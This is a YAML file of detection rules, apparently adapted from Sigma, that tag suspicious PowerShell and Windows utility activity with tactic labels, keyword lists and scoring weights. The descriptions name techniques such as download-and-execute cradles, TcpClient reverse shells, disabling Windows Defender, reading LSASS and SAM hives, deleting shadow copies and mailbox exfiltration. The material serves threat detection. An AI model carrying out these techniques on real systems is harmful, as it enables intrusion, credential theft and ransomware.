- id: sigma_1e0e1a81_e79b_44bc_935b_ddb9c8006b3d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of the Microsoft signed script "CL_mutexverifiers"
    to proxy the execution of additional PowerShell script commands
  conditions:
    summary:
      regex_any:
      - potential
      - script
      - proxy
      - execution
      - cl_mutexverifiers
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_74403157_20f5_415d_89a7_c505779585cf
  intent: execution
  tactic: execution
  description: Detects usage of the "ConvertTo-SecureString" cmdlet via the commandline.
    Which is fairly uncommon and could indicate potential suspicious activity
  conditions:
    summary:
      regex_any:
      - convertto
      - securestring
      - cmdlet
      - usage
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6b49cd1_34d6_4ead_b1bf_176e9edba9a4
  intent: execution
  tactic: execution
  description: Detects the presence of reversed PowerShell commands in the CommandLine.
    This is often used as a method of obfuscation by attackers
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - obfuscation
      - reversed
      - commands
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7bcd677_645d_4691_a8d4_7a5602b780d1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the PowerShell command lines with special characters
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - command
      - line
      - obfuscation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b6a7418_3afc_11f0_aff4_000d3abf478c
  intent: execution
  tactic: execution
  description: 'Detects the execution of obfuscated PowerShell commands that attempt
    to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).

    The technique involves manipulating strings to hide functionality, such as constructing
    class names using string insertion (e.g., ''indowsInstaller.Installer''.Insert(0,''W''))
    and correcting

    malformed URLs (e.g., converting ''htps://'' to ''https://'') at runtime. This
    behavior is commonly associated with malware loaders or droppers that aim to bypass
    static detection

    by hiding intent in runtime-generated strings and using legitimate tools for code
    execution. The use of `InstallProduct` and COM object creation, particularly combined
    with

    hidden window execution and suppressed UI, indicates an attempt to install software
    (likely malicious) without user interaction.

    '
  conditions:
    summary:
      regex_any:
      - obfuscated
      - powershell
      - install
      - windowsinstaller
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_222720a7_047f_4054_baa5_bab9be757db0
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the execution of PowerShell commands that attempt to install
    MSI packages via the

    Windows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.

    This could be indication of malicious software deployment or lateral movement
    attempts using Windows Installer functionality.

    And the usage of WindowsInstaller COM object rather than msiexec could be an attempt
    to bypass the detection.

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - install
      - windowsinstaller
      - from
      - remote
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_435e10e4_992a_4281_96f3_38b11106adde
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of the Get-ADComputer cmdlet to collect computer information
    and output it to a file
  conditions:
    summary:
      regex_any:
      - computer
      - discovery
      - export
      - adcomputer
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f4ff7323_b5fc_4323_8b52_6b9408e15788
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects potential access attempts to the PowerShell console history
    directly via history file (ConsoleHost_history.txt).

    This can give access to plaintext passwords used in PowerShell commands or used
    for general reconnaissance.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - console
      - history
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_98767d61_b2e8_4d71_b661_e36783ee24c1
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects attempts of decoding encoded Gzip archives via PowerShell.
  conditions:
    summary:
      regex_any:
      - gzip
      - archive
      - decode
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_434c08ba_8406_4d15_8b24_782cb071a691
  intent: execution
  tactic: execution
  description: Detects PowerShell commands that decrypt an ".LNK" "file to drop the
    next stage of the malware.
  conditions:
    summary:
      regex_any:
      - powershell
      - execution
      - with
      - potential
      - decryption
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1ec65a5f_9473_4f12_97da_622044d6df21
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects requests to disable Microsoft Defender features using PowerShell
    commands
  conditions:
    summary:
      regex_any:
      - powershell
      - defender
      - disable
      - scan
      - feature
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_17769c90_230e_488b_a463_e05c08e9d48f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects requests to exclude files, folders or processes from Antivirus
    scanning using PowerShell cmdlets
  conditions:
    summary:
      regex_any:
      - powershell
      - defender
      - exclusion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a7ee1722_c3c5_aeff_3212_c777e4733217
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects attackers attempting to disable Windows Defender using Powershell
  conditions:
    summary:
      regex_any:
      - disable
      - windows
      - defender
      - security
      - monitoring
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_12f6b752_042d_483e_bf9c_915a6d06ad75
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects attempts to disable the Windows Firewall using PowerShell
  conditions:
    summary:
      regex_any:
      - windows
      - firewall
      - disabled
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fb50eb7a_5ab1_43ae_bcc9_091818cb8424
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects command lines that indicate unwanted modifications to registry
    keys that disable important Internet Explorer security features
  conditions:
    summary:
      regex_any:
      - disabled
      - security
      - features
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b3512211_c67e_4707_bedc_66efc7848863
  intent: execution
  tactic: execution
  description: Detects PowerShell downgrade attack by comparing the host versions
    with the actually used engine version 2.0
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - downgrade
      - attack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_02b64f1b_3f33_4e67_aede_ef3b0a5a8fcf
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects usage of COM objects that can be abused to download files in
    PowerShell by CLSID
  conditions:
    summary:
      regex_any:
      - potential
      - objects
      - download
      - cradles
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_44e24481_6202_4c62_9127_5a0ae8e3fe3d
  intent: execution
  tactic: execution
  description: Detects the execution of a specific OneLiner to download and execute
    powershell modules in memory.
  conditions:
    summary:
      regex_any:
      - obfuscated
      - powershell
      - oneliner
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0f0450f3_8b47_441e_a31b_15a91dc243e2
  intent: execution
  tactic: execution
  description: Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest
    or Invoke-RestMethod cmdlets.
  conditions:
    summary:
      regex_any:
      - potential
      - file
      - download
      - powershell
      - invoke
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85b0b087_eddf_4a2b_b033_d771fa2b9775
  intent: execution
  tactic: execution
  description: Detects PowerShell download and execution cradles.
  conditions:
    summary:
      regex_any:
      - powershell
      - download
      - execution
      - cradles
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3b6ab547_8ec2_4991_b9d2_2b06702a48d7
  intent: execution
  tactic: execution
  description: Detects a Powershell process that contains download commands in its
    command line string
  conditions:
    summary:
      regex_any:
      - powershell
      - download
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6e04788_29e1_4557_bb14_77f761848ab8
  intent: execution
  tactic: execution
  description: Detects potentially suspicious file downloads from file sharing domains
    using PowerShell.exe
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - file
      - download
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_43d91656_a9b2_4541_b7e2_6a9bd3a13f4e
  intent: execution
  tactic: execution
  description: 'Detects execution and usage of the DSInternals PowerShell module.
    Which can be used to perform what might be considered as suspicious activity such
    as dumping DPAPI backup keys or manipulating NTDS.DIT files.

    The DSInternals PowerShell Module exposes several internal features of Active
    Directory and Azure Active Directory. These include FIDO2 and NGC key auditing,
    offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups
    and password hash calculation.

    '
  conditions:
    summary:
      regex_any:
      - dsinternals
      - suspicious
      - powershell
      - cmdlets
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_312d0384_401c_4b8b_abdf_685ffba9a332
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects email exfiltration via powershell cmdlets
  conditions:
    summary:
      regex_any:
      - email
      - exifiltration
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c740d4cf_a1e9_41de_bb16_8a46a4f57918
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects usage of the built-in PowerShell cmdlet "Enable-WindowsOptionalFeature"
    used as a Deployment Image Servicing and Management tool.

    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure,
    and update features and packages in Windows images

    '
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - windows
      - feature
      - enabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fb843269_508c_4b76_8b8d_88679db22ce7
  intent: execution
  tactic: execution
  description: Commandline to launch powershell with a base64 payload
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
      - powershell
      - with
      - base64
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee218c12_627a_4d27_9e30_d6fb2fe22ed2
  intent: execution
  tactic: execution
  description: Detects inline execution of PowerShell code from a file
  conditions:
    summary:
      regex_any:
      - powershell
      - inline
      - execution
      - from
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e716b33_63b2_46da_86a4_bd3c3b9b5dfb
  intent: execution
  tactic: execution
  description: Detects calls to cmdlets that are used to export certificates from
    the local certificate store. Threat actors were seen abusing this to steal private
    keys from compromised machines.
  conditions:
    summary:
      regex_any:
      - certificate
      - exported
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e32d4572_9826_4738_b651_95fa63747e8a
  intent: execution
  tactic: execution
  description: Detects usage of the "FromBase64String" function in the commandline
    which is used to decode a base64 encoded string
  conditions:
    summary:
      regex_any:
      - base64
      - encoded
      - powershell
      - command
      - detected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d75d6b6b_adb9_48f7_824b_ac2e786efe1f
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects attempts of decoding a base64 Gzip archive via PowerShell.
    This technique is often used as a method to load malicious content into memory
    afterward.
  conditions:
    summary:
      regex_any:
      - suspicious
      - frombase64string
      - usage
      - gzip
      - archive
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b2815d0d_7481_4bf0_9b6c_a4c48a94b349
  intent: credential_harvesting
  tactic: credential_access
  description: Detects a "Get-Process" cmdlet and it's aliases on lsass process, which
    is in almost all cases a sign of malicious activity
  conditions:
    summary:
      regex_any:
      - powershell
      - process
      - lsass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b9aeac14_2ffd_4ad3_b967_1354a4e628c3
  intent: data_staging
  tactic: collection
  description: Detects usage of the 'Get-Clipboard' cmdlet via CLI
  conditions:
    summary:
      regex_any:
      - powershell
      - clipboard
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c8a180d6_47a3_4345_a609_53f9c3d834fc
  intent: reconnaissance
  tactic: discovery
  description: Detects suspicious reconnaissance command line activity on Windows
    systems using the PowerShell Get-LocalGroupMember Cmdlet
  conditions:
    summary:
      regex_any:
      - suspicious
      - reconnaissance
      - activity
      - using
      - localgroupmember
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_514e4c3a_c77d_4cde_a00f_046425e2301e
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects usage of the "Set-Service" powershell cmdlet to configure a
    new SecurityDescriptor that allows a service to be hidden from other utilities
    such as "sc.exe", "Get-Service"...etc. (Works only in powershell 7)
  conditions:
    summary:
      regex_any:
      - abuse
      - service
      - permissions
      - hide
      - services
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_09576804_7a05_458e_a817_eb718ca91f54
  intent: execution
  tactic: execution
  description: Detects suspicious ways to run Invoke-Execution using IEX alias
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - execution
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f6a601c_2ecb_498b_9c33_660362323afa
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may install a root certificate on a compromised system
    to avoid warnings when connecting to adversary controlled web servers.
  conditions:
    summary:
      regex_any:
      - root
      - certificate
      - installed
      - from
      - susp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c31364f7_8be6_4b77_8483_dd2b5a7b69a3
  intent: execution
  tactic: execution
  description: Detects powershell scripts that import modules from suspicious directories
  conditions:
    summary:
      regex_any:
      - import
      - powershell
      - modules
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_37651c2a_42cd_4a69_ae0d_22a4349aa04a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of the "Add-AppxPackage" or it's alias "Add-AppPackage"
    to install unsigned AppX packages
  conditions:
    summary:
      regex_any:
      - unsigned
      - appx
      - installation
      - attempt
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_536e2947_3729_478c_9903_745aaffe60d2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious PowerShell invocation command parameters
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - invocations
      - specific
      - processcreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1edff897_9146_48d2_9066_52e8d8f80a2f
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects calls to PowerShell with Invoke-WebRequest cmdlet using direct
    IP access
  conditions:
    summary:
      regex_any:
      - suspicious
      - invoke
      - webrequest
      - execution
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5e3cc4d8_3e68_43db_8656_eaaeefdec9cc
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a suspicious call to Invoke-WebRequest cmdlet where the and
    output is located in a suspicious location
  conditions:
    summary:
      regex_any:
      - suspicious
      - invoke
      - webrequest
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_889719ef_dd62_43df_86c3_768fb08dc7c0
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects usage of the powerShell New-MailboxExportRequest Cmdlet to
    exports a mailbox to a remote or local share, as used in ProxyShell exploitations
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - mailbox
      - export
      - share
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_02030f2f_6199_49ec_b258_ea71b07e03dc
  intent: reconnaissance
  tactic: discovery
  description: Detects Commandlet names from well-known PowerShell exploitation frameworks
  conditions:
    summary:
      regex_any:
      - malicious
      - powershell
      - commandlets
      - processcreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_83809e84_4475_4b69_bc3e_4aad8568612f
  intent: persistence_installation
  tactic: persistence
  description: Detects the Installation of a Exchange Transport Agent
  conditions:
    summary:
      regex_any:
      - msexchange
      - transport
      - agent
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e312efd0_35a1_407f_8439_b8d434b438a6
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious encoded character syntax often used for defense
    evasion
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - obfuscation
      - wchar
      - char
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fb9d3ff7_7348_46ab_af8c_b55f5fbf39b4
  intent: execution
  tactic: execution
  description: This rule detects execution of PowerShell scripts located in the "C:\Users\Public"
    folder
  conditions:
    summary:
      regex_any:
      - execution
      - powershell
      - script
      - public
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a6fc3c46_23b8_4996_9ea2_573f4c4d88c5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects calls to the AtomicTestHarnesses "Invoke-ATHRemoteFXvGPUDisablementCommand"
    which is designed to abuse the "RemoteFXvGPUDisablement.exe" binary to run custom
    PowerShell code via module load-order hijacking.
  conditions:
    summary:
      regex_any:
      - remotefxvgpudisablement
      - abuse
      - atomictestharnesses
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07e3cb2c_0608_410d_be4b_1511cb1a0448
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects attempts to remove Windows Defender configurations using the
    'MpPreference' cmdlet
  conditions:
    summary:
      regex_any:
      - tamper
      - windows
      - defender
      - remove
      - mppreference
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_edc2f8ae_2412_4dfd_b9d5_0c57727e70be
  intent: execution
  tactic: execution
  description: Detects usage of the "TcpClient" class. Which can be abused to establish
    remote connections and reverse-shells. As seen used by the Nishang "Invoke-PowerShellTcpOneLine"
    reverse shell and other.
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - reverseshell
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_45a594aa_1fbd_4972_a809_ff5a99dd81b8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell script execution from Alternate Data Stream (ADS)
  conditions:
    summary:
      regex_any:
      - powershell
      - script
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c83bf4b5_cdf0_437c_90fa_43d734f7c476
  intent: execution
  tactic: execution
  description: Detects PowerShell script execution via input stream redirect
  conditions:
    summary:
      regex_any:
      - powershell
      - script
      - from
      - redirected
      - input
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1af57a4b_460a_4738_9034_db68b880c665
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious PowerShell scripts accessing SAM hives
  conditions:
    summary:
      regex_any:
      - powershell
      - copy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_95eadcb2_92e4_4ed1_9031_92547773a6db
  intent: execution
  tactic: execution
  description: Detects suspicious powershell invocations from interpreters or unusual
    programs
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - invocation
      - from
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a95b9b42_1308_4735_a1af_abb1c5e6f5ac
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious DACL modifications via the "Set-Service" cmdlet
    using the "SecurityDescriptorSddl" flag (Only available with PowerShell 7) that
    can be used to hide services or make them unstopable
  conditions:
    summary:
      regex_any:
      - suspicious
      - service
      - dacl
      - modification
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bdeb2cff_af74_4094_8426_724dc937f20a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell execution to set the ACL of a file or a folder
  conditions:
    summary:
      regex_any:
      - powershell
      - script
      - change
      - permission
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0944e002_e3f6_4eb5_bf69_3a3067b53d73
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell scripts to set the ACL to a file in the Windows
    folder
  conditions:
    summary:
      regex_any:
      - powershell
      - windows
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_87e3c4e8_a6a8_4ad9_bb4f_46e7ff99a180
  intent: execution
  tactic: execution
  description: Detects changing the PowerShell script execution policy to a potentially
    insecure level using the "-ExecutionPolicy" flag.
  conditions:
    summary:
      regex_any:
      - change
      - powershell
      - policies
      - insecure
      - level
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_62b20d44_1546_4e61_afce_8e175eb9473c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of the PowerShell "Set-Service" cmdlet to change the
    startup type of a service to "disabled" or "manual"
  conditions:
    summary:
      regex_any:
      - service
      - startuptype
      - change
      - powershell
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_21ff4ca9_f13a_41ad_b828_0077b2af2e40
  intent: impact_operations
  tactic: impact
  description: Detects deletion of Windows Volume Shadow Copies with PowerShell code
    and Get-WMIObject. This technique is used by numerous ransomware families such
    as Sodinokibi/REvil
  conditions:
    summary:
      regex_any:
      - deletion
      - volume
      - shadow
      - copies
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_25676e10_2121_446e_80a4_71ff8506af47
  intent: data_staging
  tactic: collection
  description: Detects adding and using Exchange PowerShell snap-ins to export mailbox
    data. As seen used by HAFNIUM and APT27
  conditions:
    summary:
      regex_any:
      - exchange
      - powershell
      - snap
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e6c54d94_498c_4562_a37c_b469d8e9a275
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell download patterns that are often used
    in malicious scripts, stagers or downloaders (make sure that your backend applies
    the strings case-insensitive)
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - download
      - execute
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36210e0d_5b19_485d_a087_c096088885f0
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell invocation with a parameter substring
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - parameter
      - substring
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_754ed792_634f_40ae_b3bc_e0448d33f695
  intent: execution
  tactic: execution
  description: Detects a suspicious or uncommon parent processes of PowerShell
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - parent
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ac175779_025a_4f12_98b0_acdaeb77ea85
  intent: execution
  tactic: execution
  description: Detects a suspicious command line execution that invokes PowerShell
    with reference to an AppData folder
  conditions:
    summary:
      regex_any:
      - powershell
      - script
      - appdata
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_deb9b646_a508_44ee_b7c9_d8965921c6b6
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation
  conditions:
    summary:
      regex_any:
      - powershell
      - token
      - obfuscation
      - process
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c443012c_7928_43bf_ac20_7eda5efe61ad
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of PowerShell with Uninstall-WindowsFeature or Remove-WindowsFeature
    cmdlets to disable or remove the Windows Defender GUI feature, a common technique
    used by adversaries to evade defenses.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - uninstall
      - windows
      - defender
      - feature
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1114e048_b69c_4f41_bc20_657245ae6e3f
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of the Get-ADUser cmdlet to collect user information
    and output it to a file
  conditions:
    summary:
      regex_any:
      - user
      - discovery
      - export
      - aduser
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c86133ad_4725_4bd0_8170_210788e0a7ba
  intent: execution
  tactic: execution
  description: Detects PowerShell command line contents that include a suspicious
    abnormal casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation
    techniques
  conditions:
    summary:
      regex_any:
      - webclient
      - casing
      - anomalies
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_114de787_4eb2_48cc_abdb_c0b449f93ea4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect use of X509Enrollment
  conditions:
    summary:
      regex_any:
      - suspicious
      - x509enrollment
      - process
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bb780e0c_16cf_4383_8383_1e5471db6cf9
  intent: execution
  tactic: execution
  description: Detects presence of a potentially xor encoded powershell command
  conditions:
    summary:
      regex_any:
      - suspicious
      - encoded
      - powershell
      - command
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85a8e5ba_bd03_4bfb_bbfa_a4409a8f8b98
  intent: data_staging
  tactic: collection
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    Cmdlet in order to compress folders and files where the output is stored in a
    potentially suspicious location that is used often by malware for exfiltration.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  conditions:
    summary:
      regex_any:
      - folder
      - compress
      - potentially
      - suspicious
      - output
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b124ddf4_778d_418e_907f_6dd3fc0d31cd
  intent: execution
  tactic: execution
  description: Detects usage of "PresentationHost" which is a utility that runs ".xbap"
    (Browser Applications) files to download arbitrary files
  conditions:
    summary:
      regex_any:
      - arbitrary
      - file
      - download
      - presentationhost
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d22e2925_cfd8_463f_96f6_89cec9d9bc5f
  intent: execution
  tactic: execution
  description: 'Detects the execution of ".xbap" (Browser Applications) files via
    PresentationHost.EXE from an uncommon location. These files can be abused to run
    malicious ".xbap" files any bypass AWL

    '
  conditions:
    summary:
      regex_any:
      - xbap
      - execution
      - from
      - uncommon
      - locations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a20391f8_76fb_437b_abc0_dba2df1952c6
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects child processes of Microsoft.NodejsTools.PressAnyKey.exe that
    can be used to execute any other binary
  conditions:
    summary:
      regex_any:
      - visual
      - studio
      - nodejstools
      - pressanykey
      - arbitrary
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bafac3d6_7de9_4dd9_8874_4a1194b493ed
  intent: defense_evasion
  tactic: defense_evasion
  description: Attackers can use print.exe for remote file copy
  conditions:
    summary:
      regex_any:
      - abusing
      - print
      - executable
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_104cdb48_a7a8_4ca7_a453_32942c6e5dcb
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects usage of "ProtocolHandler" to download files. Downloaded files
    will be located in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)

    '
  conditions:
    summary:
      regex_any:
      - file
      - download
      - using
      - protocolhandler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7f5d1c9a_3e83_48df_95a7_2b98aae6c13c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects child processes of "provlaunch.exe" which might indicate potential
    abuse to proxy execution.
  conditions:
    summary:
      regex_any:
      - potential
      - provlaunch
      - binary
      - proxy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f9999590_1f94_4a34_a91e_951e47bedefd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious child processes of "provlaunch.exe" which might
    indicate potential abuse to proxy execution.
  conditions:
    summary:
      regex_any:
      - suspicious
      - provlaunch
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2158f96f_43c2_43cb_952a_ab4580f32382
  intent: data_staging
  tactic: collection
  description: Detects execution of Windows Problem Steps Recorder (psr.exe), a utility
    used to record the user screen and clicks.
  conditions:
    summary:
      regex_any:
      - screen
      - capture
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f38a82d2_fba3_4781_b549_525efbec8506
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of 3proxy, a tiny free proxy server
  conditions:
    summary:
      regex_any:
      - 3proxy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
